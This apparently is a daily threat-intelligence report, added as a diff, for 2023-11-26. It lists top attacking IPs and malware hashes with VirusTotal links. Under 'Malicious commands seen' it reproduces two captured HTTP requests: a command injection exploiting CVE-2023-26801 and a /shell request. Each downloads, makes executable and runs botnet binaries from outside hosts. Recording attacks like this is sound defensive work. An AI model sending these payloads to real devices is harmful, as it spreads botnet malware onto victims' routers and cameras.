@@ -1,0 +1,33 @@
+Top 5 IPs for 2023-11-26:
+45.76.235.207
+97.74.91.196
+20.244.134.31
+111.67.199.142
+164.92.173.174
+
+
+Top malware seen: 
+
+0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+https://www.virustotal.com/gui/file/0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+63946c28efa919809c03be75a3937c4be80589a9df79cd1be72037d493b70857
+https://www.virustotal.com/gui/file/63946c28efa919809c03be75a3937c4be80589a9df79cd1be72037d493b70857
+a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46466127ea0f078c7f5437
+https://www.virustotal.com/gui/file/a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46466127ea0f078c7f5437
+d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+https://www.virustotal.com/gui/file/d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+
+Malicious commands seen:
+This is exploiting : https://nvd.nist.gov/vuln/detail/CVE-2023-26801
+
+POST /goform/set_LimitClient_cfg HTTP/1.1
+Cookie: user=admin
+time1=00:00-00:00&time2=00:00-00:00&mac=;wget http://2.56.247.167/vbot.mpsl; chmod 777 vbot.mpsl; ./vbot.mpsl lblink.selfrep;
+
+
+GET /shell?cd+/tmp;rm+project01.arm+project01.arm7;wget+http:/\\/93.123.85.6/project01.arm7;chmod+777+project01.arm7;./project01.arm7+ipcams;wget+http:/\\/93.123.85.6/project01.arm;chmod+777+project01.arm;./project01.arm+ipcams HTTP/1.1
+Connection: keep-alive
+Cache-Control: max-age=0
+User-Agent: KrebsOnSecurity
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9
